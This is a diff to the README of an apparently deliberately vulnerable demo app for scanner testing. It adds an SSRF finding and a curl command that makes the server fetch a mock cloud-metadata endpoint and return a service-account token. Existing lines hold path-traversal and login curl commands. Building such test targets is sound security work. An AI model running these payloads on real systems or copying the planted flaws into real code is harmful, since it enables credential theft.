@@ -39,6 +39,7 @@ start flagging as rulesets evolve.
 | Path traversal | CWE-22 | `app.py` `/api/corefile` | `open(DIR + "/" + name)` — not flagged |
 | Weak hashing | CWE-327 | `app.py` `/api/fingerprint` | `hashlib.md5` — detected as low/informational at most |
 | Broken access control | CWE-284 | `app.py` `/api/cases/<id>` | `?org=` / `X-Role` trust + `?debug=1` backdoor — a runtime/DAST finding, not static |
+| Server-Side Request Forgery | CWE-918 | `app.py` `/api/fetch` | "Attach remote corefile" fetches an unauth, attacker-controlled URL via `urllib.request.urlopen` and returns the body — full-read SSRF (reaches cloud metadata → SA-token theft, localhost-only services, and `file://`). Live walkthrough in `demo/ssrf/RUNBOOK.md` |
 | Extra hardcoded secrets | CWE-798 | `config.py` | AWS key, Slack token, Sentry DSN, Postgres password, and the Flask `SECRET_KEY` (session-signing key → cookie forgery) — detected but below the secrets policy's HIGH bar (GitHub PATs are the reliable hit) |
 
 ## C. Private area — authenticated findings (Analyst Console)
@@ -91,4 +92,10 @@ curl --path-as-is 'http://127.0.0.1:8000/api/corefile?name=../config.py'
 curl -s -c /tmp/cj.txt -d email=arivera@acme-checkout.io -d password=corefile \
   http://127.0.0.1:8000/login
 curl -s -b /tmp/cj.txt http://127.0.0.1:8000/api/account/u-2001/integrations
+
+# SSRF — make the server fetch the cloud metadata service and hand back the
+# workload's service-account token (mock target: python3 demo/ssrf/metadata_mock.py)
+curl -s 'http://127.0.0.1:8000/api/fetch?url=http://127.0.0.1:8081/computeMetadata/v1/instance/service-accounts/default/token'
 ```
+
+Full SSRF meeting walkthrough (setup, talk track, remediation): `demo/ssrf/RUNBOOK.md`.
